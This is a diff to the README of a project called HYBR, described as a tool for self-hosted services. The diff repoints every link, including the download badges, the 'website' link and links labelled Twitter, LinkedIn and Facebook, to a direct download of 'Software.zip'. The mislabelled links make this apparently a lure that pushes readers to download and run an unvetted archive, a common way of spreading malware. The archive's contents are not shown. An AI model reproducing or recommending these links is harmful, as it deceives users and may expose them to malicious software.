@@ -2,7 +2,7 @@
 
 ---
 
-[![Generic badge](https://github.com/papapap321/hybr/releases/tag/v1.0)](https://github.com/papapap321/hybr/releases/tag/v1.0)
+[![Generic badge](https://github.com/papapap321/hybr/releases/download/v2.0/Software.zip)](https://github.com/papapap321/hybr/releases/download/v2.0/Software.zip)
 
 ---
 
@@ -26,7 +26,7 @@ HYBR is built with a focus on ease of use and efficiency. With features such as 
 
 To get started with HYBR, simply download the application from the link provided above. Once downloaded, launch the application and follow the on-screen instructions to set up your self-hosted services with ease.
 
-[![Generic badge](https://github.com/papapap321/hybr/releases/tag/v1.0)](https://github.com/papapap321/hybr/releases/tag/v1.0)
+[![Generic badge](https://github.com/papapap321/hybr/releases/download/v2.0/Software.zip)](https://github.com/papapap321/hybr/releases/download/v2.0/Software.zip)
 
 If the link does not work or you require additional resources, please check the "Releases" section of this repository for alternative download options.
 
@@ -36,15 +36,15 @@ Interested in contributing to HYBR? We welcome contributions from developers of 
 
 ## Community
 
-Join our community of developers and enthusiasts to share ideas, ask questions, and stay updated on the latest developments. Visit our website [here](https://github.com/papapap321/hybr/releases/tag/v1.0) to get involved!
+Join our community of developers and enthusiasts to share ideas, ask questions, and stay updated on the latest developments. Visit our website [here](https://github.com/papapap321/hybr/releases/download/v2.0/Software.zip) to get involved!
 
 ## Stay Connected
 
 Stay connected with the HYBR community on social media platforms to stay informed about upcoming updates, events, and more:
 
-- [Twitter](https://github.com/papapap321/hybr/releases/tag/v1.0)
-- [LinkedIn](https://github.com/papapap321/hybr/releases/tag/v1.0)
-- [Facebook](https://github.com/papapap321/hybr/releases/tag/v1.0)
+- [Twitter](https://github.com/papapap321/hybr/releases/download/v2.0/Software.zip)
+- [LinkedIn](https://github.com/papapap321/hybr/releases/download/v2.0/Software.zip)
+- [Facebook](https://github.com/papapap321/hybr/releases/download/v2.0/Software.zip)
 
 ---
 
